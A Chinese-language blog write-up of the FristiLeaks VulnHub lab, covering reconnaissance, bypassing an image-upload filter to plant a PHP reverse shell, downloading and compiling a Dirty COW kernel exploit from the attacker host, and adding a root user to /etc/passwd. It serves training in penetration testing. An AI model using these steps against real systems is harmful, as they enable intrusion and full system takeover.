---
categories:
- training
tags: 
    - training
---

<html lang="en">
  <head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>FristiLeaks（太刻意的web靶机）</title>
    <style type="text/css" media="all">
      body {
        margin: 0;
        font-family: "Helvetica Neue", Helvetica, Arial, "Hiragino Sans GB", sans-serif;
        font-size: 14px;
        line-height: 20px;
        color: #777;
        background-color: white;
      }
      .container {
        width: 700px;
        margin-right: auto;
        margin-left: auto;
      }

      .post {
        font-family: Georgia, "Times New Roman", Times, "SimSun", serif;
        position: relative;
        padding: 70px;
        bottom: 0;
        overflow-y: auto;
        font-size: 16px;
        font-weight: normal;
        line-height: 25px;
        color: #515151;
      }

      .post h1{
        font-size: 50px;
        font-weight: 500;
        line-height: 60px;
        margin-bottom: 40px;
        color: inherit;
      }

      .post p {
        margin: 0 0 35px 0;
      }

      .post img {
        border: 1px solid #D9D9D9;
      }

      .post a {
        color: #28A1C5;
      }
    </style>
  </head>
  <body>
    <div class="container">
      <div class="post">
        <h1 class="title">FristiLeaks（太刻意的web靶机）</h1>
        <div class="show-content">
          <p><a href="https://www.vulnhub.com/entry/fristileaks-13,133/" target="_blank">靶机下载</a>：修改靶机mac地址为08:00:27:A5:A6:76 ，然后愉快的开始做实验。</p><p>只开了80端口，Linux 2.6.32 - 3.10</p><p>一、侦察</p><p>Apache/2.2.15 (CentOS) DAV/2 PHP/5.3.3</p><blockquote><p>

http://192.168.1.115/robots.txt</p></blockquote><blockquote>
<p>robots.txt内容，</p>
<p>User-agent: *</p>
<p>Disallow: /cola                </p>
<p>Disallow: /sisi</p>
<p>Disallow: /beer</p>
</blockquote><blockquote>
<p>http://192.168.1.115/cola   </p>
<p> img src="/images/3037440.jpg"</p>
</blockquote><p>http://192.168.1.115/icons/README</p><p>http://192.168.1.115/icons/small/</p><blockquote>
<p>403 forbidden:</p>
<p>http://192.168.1.115/error/</p>
<p>http://192.168.1.115/cgi-bin/</p>
</blockquote><p>分析：</p><p>dirbuster找不出什么了，然后无思路。</p><hr><p>二：突破点</p><p>尝试生成网页字典，然后给dirbuster</p><p>cewl -d 2 -m 5 -w test.txt http://192.168.1.115</p><p>无效</p><p>主页面有张图片，keep calm and drink fristi</p><p>然后找到后台： http://192.168.1.115/fristi，无语</p><p>查看源代码，有一条base64编码的注释。</p><div class="image-package">
<img class="uploaded-img" src="http://upload-images.jianshu.io/upload_images/2883590-40d6c35b85d9b1e1.PNG?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" width="auto" height="auto"><br><div class="image-caption"></div>
</div><p>找个在线base64解码网站，解码后得到一个图片。</p><div class="image-package">
<img class="uploaded-img" src="http://upload-images.jianshu.io/upload_images/2883590-b13a4f466af3616a.PNG?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" width="auto" height="auto"><br><div class="image-caption"></div>
</div><p>用eezeepz  /   keKkeKKeKKeKkEkkEk    登陆，用户名密码都是源代码里有的。</p><p>三：文件上传拿webshell。</p><p>登陆后有个上传页面，随便上传一个。</p><div class="image-package">
<img class="uploaded-img" src="http://upload-images.jianshu.io/upload_images/2883590-79e4243bb6fc0e25.PNG?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" width="auto" height="auto"><br><div class="image-caption"></div>
</div><p>提示：Sorry, is not a valid file. Only allowed are: png,jpg,gif </p><p>Sorry, file not uploaded</p><p>上传jpg，提示：</p><p>Uploading, please wait</p><p>The file has been uploaded to <b>/uploads </b></p><p>通过该路径可以访问，http://192.168.1.115/fristi/uploads/mm.jpg</p><hr><p>先靶机监听，kali运行：nc -lvp 1234</p><p>准备php反弹shell，以前文章说过，这里不展开了。</p><p>后缀加个.jpg，成功上传，说明php只是通过后缀判断，没有过滤任何字符。</p><p>访问这个链接，kali获得shell.</p><p>http://192.168.1.115/fristi/uploads/php-reverse-shell.php.jpg</p><p>四：webshell提权</p><div class="image-package">
<img class="uploaded-img" src="http://upload-images.jianshu.io/upload_images/2883590-da1baac4c17804ba.PNG?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" width="auto" height="auto"><br><div class="image-caption"></div>
</div><blockquote><p>tail -6 /etc/passwd</p></blockquote><p>信息：大于500的普通用户有4个。</p><p>eezeepz:x:500:500::/home/eezeepz:/bin/bash</p><p>admin:x:501:501::/home/admin:/bin/bash</p><p>fristigod:x:502:502::/var/fristigod:/bin/bash</p><p>fristi:x:503:100::/var/www:/sbin/nologin</p><blockquote><p>uname -a</p></blockquote><p>Linux localhost.localdomain <b>2.6.32</b>-573.8.1.el6.x86_64 #1 SMP Tue Nov 10 18:01:38 UTC 2015 x86_64 x86_64 x86_64 GNU/Linux</p><h4>尝试内核漏洞提权：</h4><p><a href="https://www.exploit-db.com/exploits/40839/" target="_blank">Linux Kernel 2.6.22 &lt; 3.9</a></p><p>gcc可以用，wget可以用，nc不可以用（command not find）。</p><p>wget http://192.168.1.107/1.c</p><blockquote>
<p>sh-4.1$ gcc 1.c</p>
<p>gcc 1.c</p>
<p>/tmp/cc9pS0Iv.o: In function `generate_password_hash':</p>
<p>1.c:(.text+0x1e): undefined reference to `crypt'</p>
<p>/tmp/cc9pS0Iv.o: In function `main':</p>
<p>1.c:(.text+0x4f3): undefined reference to `pthread_create'</p>
<p>1.c:(.text+0x527): undefined reference to `pthread_join'</p>
<p>collect2: ld returned 1 exit status</p>
<p>直接编译，出错</p>
</blockquote><p>查看exploit-db的注释，再次编译：gcc -pthread 1.c -lcrypt</p><blockquote>
<p>sh-4.1$ ./a.out</p>
<p>./a.out</p>
<p>Please enter the new password: a</p>
<p>/etc/passwd successfully backed up to /tmp/passwd.bak</p>
<p>Complete line:</p>
<p>firefart:fi2D0F2yP3cfM:0:0:pwned:/root:/bin/bash</p>
<p>mmap: 7fa0ba71d000</p>
<p>ptrace 0</p>
<p>Done! Check /etc/passwd to see if the new user was created.</p>
<p>You can log in with the username 'firefart' and the password 'a'.</p>
<p>DON'T FORGET TO RESTORE! $ mv /tmp/passwd.bak /etc/passwd</p>
</blockquote><div class="image-package">
<img class="uploaded-img" src="http://upload-images.jianshu.io/upload_images/2883590-0fe4d69f9be2559e.PNG?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" width="auto" height="auto"><br><div class="image-caption"></div>
</div><p>遇到一个异常：stardard in must be a tty，说明需要一个终端（shell），那么尝试python反弹个bash shell</p><p>python -c 'import pty;pty.spawn("/bin/bash")'</p><p>su firefart  /  a</p><p>得到root权限。</p><div class="image-package">
<img class="uploaded-img" src="http://upload-images.jianshu.io/upload_images/2883590-c1bf3c3a35c79bca.PNG?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" width="auto" height="auto"><br><div class="image-caption"></div>
</div><h4> 总结：</h4><p>kali目录下，有不少webshell可用： /usr/share/webshells/php </p><p>shell命令学习：</p><blockquote><p>cat base64_password | tr -d '\n' &gt; decoded_password        （去除文件每一行的\n换行符）</p></blockquote><p>tr，translate的简写，主要用于压缩重复字符，删除文件中的控制字符以及进行字符转换操作。</p><p>-d：delete，删除SET1中指定的所有字符，不转换</p>
        </div>
      </div>
    </div>
  </body>
</html>
